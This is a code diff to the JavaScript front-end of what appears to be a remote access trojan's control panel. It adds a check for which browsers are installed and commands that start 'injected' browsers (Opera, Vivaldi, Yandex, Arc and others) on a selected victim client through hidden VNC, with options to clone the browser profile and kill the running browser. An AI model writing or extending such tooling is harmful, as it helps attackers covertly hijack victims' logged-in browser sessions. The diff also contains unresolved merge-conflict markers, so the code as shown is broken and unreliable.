@@ -378,6 +378,22 @@ import { checkFeatureAccess } from "./feature-gate.js";
     }
   }
 
+  function handleBrowserCheckResult(msg) {
+    if (!msg.browsers || !contextMenu) return;
+    contextMenu.querySelectorAll("[data-browser]").forEach((btn) => {
+      const key = btn.dataset.browser;
+      if (key && msg.browsers[key] === false) {
+        btn.classList.add("browser-unavailable");
+      } else {
+        btn.classList.remove("browser-unavailable");
+      }
+    });
+  }
+
+  function requestBrowserCheck() {
+    sendCmd("hvnc_browser_check", {});
+  }
+
   function sendCmd(type, payload) {
     if (!activeClientId) {
       console.warn("No active client selected");
@@ -753,6 +769,10 @@ import { checkFeatureAccess } from "./feature-gate.js";
         handleLookupResult(msg);
         return;
       }
+      if (msg && msg.type === "hvnc_browser_check_result") {
+        handleBrowserCheckResult(msg);
+        return;
+      }
       if (msg && msg.type === "hvnc_dxgi_status") {
         handleDXGIStatus(msg);
         return;
@@ -782,6 +802,10 @@ import { checkFeatureAccess } from "./feature-gate.js";
     }
     if (msg && msg.type === "hvnc_lookup_result") {
       handleLookupResult(msg);
+      return;
+    }
+    if (msg && msg.type === "hvnc_browser_check_result") {
+      handleBrowserCheckResult(msg);
       return;
     }
     if (msg && msg.type === "hvnc_dxgi_status") {
@@ -822,6 +846,7 @@ import { checkFeatureAccess } from "./feature-gate.js";
         sendCmd("hvnc_select_display", { display: parseInt(displaySelect.value, 10) });
       }
     });
+    requestBrowserCheck();
   }
 
   function onWsClose() {
@@ -1025,11 +1050,44 @@ import { checkFeatureAccess } from "./feature-gate.js";
           const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
           const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
           sendCmd("hvnc_start_browser_injected", { browser: "firefox", clone, cloneLite, killIfRunning });
+<<<<<<< HEAD
         } else if (action === "start-opera-gx") {
           const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
           const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
           const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
           sendCmd("hvnc_start_browser_injected", { browser: "opera-gx", clone, cloneLite, killIfRunning });
+=======
+        } else if (action === "start-opera") {
+          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
+          sendCmd("hvnc_start_browser_injected", { browser: "opera", clone, cloneLite, killIfRunning });
+        } else if (action === "start-operagx") {
+          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
+          sendCmd("hvnc_start_browser_injected", { browser: "operagx", clone, cloneLite, killIfRunning });
+        } else if (action === "start-vivaldi") {
+          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
+          sendCmd("hvnc_start_browser_injected", { browser: "vivaldi", clone, cloneLite, killIfRunning });
+        } else if (action === "start-yandex") {
+          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
+          sendCmd("hvnc_start_browser_injected", { browser: "yandex", clone, cloneLite, killIfRunning });
+        } else if (action === "start-waterfox") {
+          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
+          sendCmd("hvnc_start_browser_injected", { browser: "waterfox", clone, cloneLite, killIfRunning });
+        } else if (action === "start-arc") {
+          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
+          sendCmd("hvnc_start_browser_injected", { browser: "arc", clone, cloneLite, killIfRunning });
+>>>>>>> 77ddc397a0edc76b0cb1c064ff9887ff6634e3f2
         } else if (action === "start-custom") {
           hideContextMenu();
           showCustomExeModal();
